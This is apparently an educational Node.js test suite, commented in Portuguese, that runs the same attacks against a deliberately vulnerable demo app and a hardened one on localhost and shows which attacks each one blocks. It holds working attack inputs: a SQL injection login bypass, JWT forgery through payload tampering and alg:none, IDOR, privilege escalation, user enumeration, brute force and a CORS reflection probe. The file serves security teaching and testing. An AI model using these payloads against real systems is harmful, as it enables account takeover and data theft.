// =====================================================================
//  Suíte de testes de segurança: roda os MESMOS ataques contra os dois
//  sistemas e mostra, lado a lado, quem foi explorado e quem bloqueou.
//  Uso: npm run atacar   (com `npm run ambos` rodando em outro terminal)
//  Somente fetch nativo + pg (sem dependências nativas).
// =====================================================================
import fs from "node:fs";
import path from "node:path";
import crypto from "node:crypto";
import { fileURLToPath } from "node:url";
import pg from "pg";
import dotenv from "dotenv";

const RAIZ = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const ORIGEM_MALICIOSA = "http://site-malicioso.local";

const cor = {
  vermelho: (t) => `\x1b[31m${t}\x1b[0m`,
  verde: (t) => `\x1b[32m${t}\x1b[0m`,
  amarelo: (t) => `\x1b[33m${t}\x1b[0m`,
  cinza: (t) => `\x1b[90m${t}\x1b[0m`,
  negrito: (t) => `\x1b[1m${t}\x1b[0m`,
};

// ---------------------------------------------------------------------
// Configuração dos dois alvos
// ---------------------------------------------------------------------
function urlDoBanco(sistema) {
  const arquivo = path.join(RAIZ, sistema, ".env");
  if (!fs.existsSync(arquivo)) {
    console.error(cor.vermelho(`Arquivo ${sistema}/.env não encontrado. Rode \`npm run setup\` primeiro.`));
    process.exit(1);
  }
  // O pg não entende o parâmetro ?schema=public do Prisma: removemos a query string.
  return dotenv.parse(fs.readFileSync(arquivo)).DATABASE_URL.split("?")[0];
}

const ALVOS = {
  vulneravel: { nome: "VULNERÁVEL (3001)", base: "http://127.0.0.1:3001", banco: urlDoBanco("sistema-vulneravel") },
  seguro: { nome: "SEGURO (3002)", base: "http://127.0.0.1:3002", banco: urlDoBanco("sistema-seguro") },
};

// ---------------------------------------------------------------------
// Utilitários
// ---------------------------------------------------------------------
async function http(alvo, caminho, { method = "GET", body, headers = {} } = {}) {
  const resposta = await fetch(alvo.base + caminho, {
    method,
    headers: { ...(body ? { "Content-Type": "application/json" } : {}), ...headers },
    body: body ? JSON.stringify(body) : undefined,
    redirect: "manual",
  });
  const texto = await resposta.text();
  let json = null;
  try {
    json = JSON.parse(texto);
  } catch {
    /* resposta não é JSON */
  }
  return { status: resposta.status, texto, json, headers: resposta.headers };
}

const trecho = (t, max = 70) => String(t ?? "").replace(/\s+/g, " ").slice(0, max);

async function consultarBanco(alvo, sql, params) {
  const cliente = new pg.Client({ connectionString: alvo.banco });
  await cliente.connect();
  try {
    return (await cliente.query(sql, params)).rows;
  } finally {
    await cliente.end();
  }
}

// Busca os ids pelo e-mail (nunca fixamos ids no código).
async function idsPorEmail(alvo) {
  const linhas = await consultarBanco(alvo, 'SELECT "id", "email" FROM "Usuario" WHERE "email" = ANY($1)', [
    ["ana@teste.com", "bruno@teste.com", "admin@teste.com", "alvo@teste.com"],
  ]);
  const ids = Object.fromEntries(linhas.map((l) => [l.email.split("@")[0], l.id]));
  for (const nome of ["ana", "bruno", "admin", "alvo"]) {
    if (!ids[nome]) {
      console.error(cor.vermelho(`Usuário ${nome}@teste.com não existe em ${alvo.nome}. Rode \`npm run reset\`.`));
      process.exit(1);
    }
  }
  return ids;
}

// Faz login e devolve a "credencial" que cada sistema usa:
// - vulnerável: header Authorization: Bearer <id>
// - seguro: o fetch do Node não guarda cookies, então capturamos o Set-Cookie e reenviamos no header Cookie
async function logar(alvo, tipo, email, senha) {
  const r = await http(alvo, "/api/auth/login", { method: "POST", body: { email, senha } });
  if (r.status !== 200) throw new Error(`login de ${email} falhou em ${alvo.nome}: ${r.status} ${trecho(r.texto)}`);
  if (tipo === "vulneravel") return { headers: { Authorization: `Bearer ${r.json.token}` } };
  const cookie = r.headers.getSetCookie().find((c) => c.startsWith("token="));
  const token = cookie.split(";")[0].slice("token=".length);
  return { headers: { Cookie: `token=${token}` }, jwt: token };
}

const b64url = (obj) => Buffer.from(JSON.stringify(obj)).toString("base64url");

// Resultado de um teste num sistema
const explorado = (evidencia) => ({ explorado: true, evidencia });
const bloqueado = (evidencia) => ({ explorado: false, evidencia });

// ---------------------------------------------------------------------
// Os ataques. Cada função recebe (alvo, tipo, contexto) e devolve explorado/bloqueado.
// ---------------------------------------------------------------------
const TESTES = {
  T1: {
    titulo: "T1 SQL Injection no login",
    async rodar(alvo) {
      const r = await http(alvo, "/api/auth/login", {
        method: "POST",
        body: { email: "admin@teste.com' --", senha: "qualquer-coisa" },
      });
      const ev = { status: r.status, resposta: trecho(r.texto) };
      return r.status === 200 && r.json?.usuario?.role === "admin" ? explorado(ev) : bloqueado(ev);
    },
  },

  T2: {
    titulo: "T2 Senha legível no banco",
    async rodar(alvo) {
      const [linha] = await consultarBanco(alvo, 'SELECT "senha" FROM "Usuario" WHERE "email" = $1', ["ana@teste.com"]);
      const ev = { status: "DB", resposta: `senha da ana no banco = ${trecho(linha.senha, 40)}` };
      if (linha.senha === "Ana@12345") return explorado(ev);
      return /^\$2[ab]\$/.test(linha.senha) ? bloqueado(ev) : explorado({ ...ev, resposta: ev.resposta + " (formato inesperado)" });
    },
  },

  T3: {
    titulo: "T3 CPF legível no banco",
    async rodar(alvo) {
      const [linha] = await consultarBanco(alvo, 'SELECT "cpf" FROM "Usuario" WHERE "email" = $1', ["ana@teste.com"]);
      const ev = { status: "DB", resposta: `cpf da ana no banco = ${trecho(linha.cpf, 40)}` };
      if (/^\d{11}$/.test(linha.cpf)) return explorado(ev);
      return /^[0-9a-f]+:[0-9a-f]+:[0-9a-f]+$/i.test(linha.cpf) ? bloqueado(ev) : explorado(ev);
    },
  },

  T4: {
    titulo: "T4 Token falsificado",
    async rodar(alvo, tipo, ctx) {
      if (tipo === "vulneravel") {
        // (a) "token" = id do admin, sem ter feito login como admin
        const r = await http(alvo, "/api/auth/me", { headers: { Authorization: `Bearer ${ctx.ids.admin}` } });
        const ev = { status: r.status, resposta: `Bearer ${ctx.ids.admin} → ${trecho(r.texto, 55)}` };
        return r.status === 200 && r.json?.role === "admin" ? explorado(ev) : bloqueado(ev);
      }
      // (b1) JWT da ana com o payload trocado para role: admin, SEM re-assinar
      const [cabecalho, payload, assinatura] = ctx.ana.jwt.split(".");
      const dados = JSON.parse(Buffer.from(payload, "base64url").toString());
      const adulterado = `${cabecalho}.${b64url({ ...dados, sub: String(ctx.ids.admin), role: "admin" })}.${assinatura}`;
      const r1 = await http(alvo, "/api/admin/usuarios", { headers: { Cookie: `token=${adulterado}` } });
      // (b2) JWT com alg: none (sem assinatura)
      const semAssinatura = `${b64url({ alg: "none", typ: "JWT" })}.${b64url({
        sub: String(ctx.ids.admin),
        role: "admin",
        exp: Math.floor(Date.now() / 1000) + 3600,
      })}.`;
      const r2 = await http(alvo, "/api/admin/usuarios", { headers: { Cookie: `token=${semAssinatura}` } });
      const ev = {
        status: `${r1.status}/${r2.status}`,
        resposta: `payload alterado → ${trecho(r1.texto, 40)} | alg:none → ${trecho(r2.texto, 40)}`,
      };
      return r1.status === 401 && r2.status === 401 ? bloqueado(ev) : explorado(ev);
    },
  },

  T5: {
    titulo: "T5 IDOR (ana lê dados do bruno)",
    async rodar(alvo, tipo, ctx) {
      const r = await http(alvo, `/api/usuarios/${ctx.ids.bruno}`, { headers: ctx.ana.headers });
      const ev = { status: r.status, resposta: trecho(r.texto) };
      return r.status === 200 && r.json?.email === "bruno@teste.com" ? explorado(ev) : bloqueado(ev);
    },
  },

  T6: {
    titulo: "T6 Escalação (ana na rota admin)",
    async rodar(alvo, tipo, ctx) {
      const r = await http(alvo, "/api/admin/usuarios", { headers: ctx.ana.headers });
      const ev = { status: r.status, resposta: trecho(r.texto) };
      return r.status === 200 && Array.isArray(r.json) ? explorado(ev) : bloqueado(ev);
    },
  },

  T7a: {
    titulo: "T7a Enumeração de usuários",
    async rodar(alvo) {
      // e-mail aleatório: cada execução usa uma chave nova no rate limit (teste idempotente)
      const inexistente = `inexistente-${crypto.randomBytes(4).toString("hex")}@teste.com`;
      const r1 = await http(alvo, "/api/auth/login", { method: "POST", body: { email: inexistente, senha: "Errada@123" } });
      const r2 = await http(alvo, "/api/auth/login", { method: "POST", body: { email: "ana@teste.com", senha: "Errada@123" } });
      const m1 = r1.json?.erro;
      const m2 = r2.json?.erro;
      const ev = { status: `${r1.status}/${r2.status}`, resposta: `inexistente: "${m1}" | senha errada: "${m2}"` };
      return m1 !== m2 ? explorado(ev) : bloqueado(ev);
    },
  },

  T7b: {
    titulo: "T7b Força bruta (10 tentativas)",
    async rodar(alvo) {
      const statuses = [];
      for (let i = 1; i <= 10; i++) {
        const r = await http(alvo, "/api/auth/login", {
          method: "POST",
          body: { email: "alvo@teste.com", senha: `chute-${i}` },
        });
        statuses.push(r.status);
        if (r.status === 429) {
          // 429 já na 1ª tentativa = bloqueio de uma execução anterior (ainda na janela): conta como BLOQUEADO
          return bloqueado({ status: 429, resposta: `bloqueado na tentativa ${i} → ${trecho(r.texto, 45)}` });
        }
      }
      return explorado({ status: statuses.at(-1), resposta: `10 tentativas aceitas, sem bloqueio (${statuses.join(",")})` });
    },
  },

  T8: {
    titulo: "T8 CORS reflete origem maliciosa",
    async rodar(alvo) {
      const r = await http(alvo, "/api/auth/login", {
        method: "OPTIONS",
        headers: { Origin: ORIGEM_MALICIOSA, "Access-Control-Request-Method": "POST" },
      });
      const acao = r.headers.get("access-control-allow-origin");
      const ev = { status: r.status, resposta: `Access-Control-Allow-Origin: ${acao ?? "(ausente)"}` };
      return acao === ORIGEM_MALICIOSA || acao === "*" ? explorado(ev) : bloqueado(ev);
    },
  },
};

// Ordem de execução: T7b por último (ele bloqueia a conta alvo no seguro).
const ORDEM_EXECUCAO = ["T1", "T2", "T3", "T4", "T5", "T6", "T7a", "T8", "T7b"];
// Ordem de exibição: lógica, de T1 a T8.
const ORDEM_EXIBICAO = ["T1", "T2", "T3", "T4", "T5", "T6", "T7a", "T7b", "T8"];

// ---------------------------------------------------------------------
// Tabela colorida
// ---------------------------------------------------------------------
// Largura visível: ignora códigos de cor e conta emojis como 2 colunas.
const largura = (t) =>
  [...t.replace(/\x1b\[[0-9;]*m/g, "")].reduce((n, ch) => n + (/\p{Extended_Pictographic}/u.test(ch) ? 2 : ch === "️" ? 0 : 1), 0);
const completar = (t, n) => t + " ".repeat(Math.max(0, n - largura(t)));

function celula(res) {
  if (res.erro) return cor.amarelo(`⚠️ ERRO`);
  return res.explorado
    ? cor.vermelho(`❌ EXPLORADO (${res.evidencia.status})`)
    : cor.verde(`✅ BLOQUEADO (${res.evidencia.status})`);
}

// ---------------------------------------------------------------------
// Execução
// ---------------------------------------------------------------------
async function servidorNoAr(alvo) {
  try {
    const r = await fetch(alvo.base + "/login.html", { signal: AbortSignal.timeout(3000) });
    return r.ok;
  } catch {
    return false;
  }
}

async function main() {
  console.log(cor.negrito("\n=== Suíte de Testes de Segurança — Vulnerável x Seguro ===\n"));

  const fora = [];
  for (const alvo of Object.values(ALVOS)) if (!(await servidorNoAr(alvo))) fora.push(alvo.base);
  if (fora.length) {
    console.error(cor.vermelho(`Não responderam: ${fora.join(", ")}`));
    console.error("Suba os sistemas com `npm run ambos` em outro terminal");
    process.exit(1);
  }

  const resultados = {}; // resultados[teste][tipo]
  for (const [tipo, alvo] of Object.entries(ALVOS)) {
    const ctx = { ids: await idsPorEmail(alvo) };
    ctx.ana = await logar(alvo, tipo, "ana@teste.com", "Ana@12345");
    for (const id of ORDEM_EXECUCAO) {
      resultados[id] ??= {};
      try {
        resultados[id][tipo] = await TESTES[id].rodar(alvo, tipo, ctx);
      } catch (erro) {
        resultados[id][tipo] = { erro: erro.message, evidencia: { status: "-", resposta: erro.message } };
      }
    }
  }

  const C1 = 36;
  const C2 = 24;
  console.log(cor.negrito(`${completar("TESTE", C1)} | ${completar(ALVOS.vulneravel.nome, C2)} | ${ALVOS.seguro.nome}`));
  console.log("-".repeat(C1) + "-+-" + "-".repeat(C2) + "-+-" + "-".repeat(24));
  let conforme = 0;
  for (const id of ORDEM_EXIBICAO) {
    const { vulneravel, seguro } = resultados[id];
    if (vulneravel.explorado && !vulneravel.erro && !seguro.explorado && !seguro.erro) conforme++;
    console.log(`${completar(TESTES[id].titulo, C1)} | ${completar(celula(vulneravel), C2)} | ${celula(seguro)}`);
  }

  console.log(cor.negrito("\nEvidências (status HTTP e trecho da resposta):"));
  for (const id of ORDEM_EXIBICAO) {
    console.log(cor.negrito(`  ${TESTES[id].titulo}`));
    for (const tipo of ["vulneravel", "seguro"]) {
      const { evidencia } = resultados[id][tipo];
      console.log(cor.cinza(`    ${completar(tipo === "vulneravel" ? "3001" : "3002", 5)} [${evidencia.status}] ${evidencia.resposta}`));
    }
  }

  const total = ORDEM_EXIBICAO.length;
  const msg = `\n${conforme}/${total} testes com o resultado esperado (EXPLORADO no 3001 e BLOQUEADO no 3002).`;
  console.log(conforme === total ? cor.verde(cor.negrito(msg)) : cor.amarelo(cor.negrito(msg)));
  process.exit(conforme === total ? 0 : 1);
}

main().catch((erro) => {
  console.error(cor.vermelho("Erro inesperado na suíte:"), erro);
  process.exit(1);
});
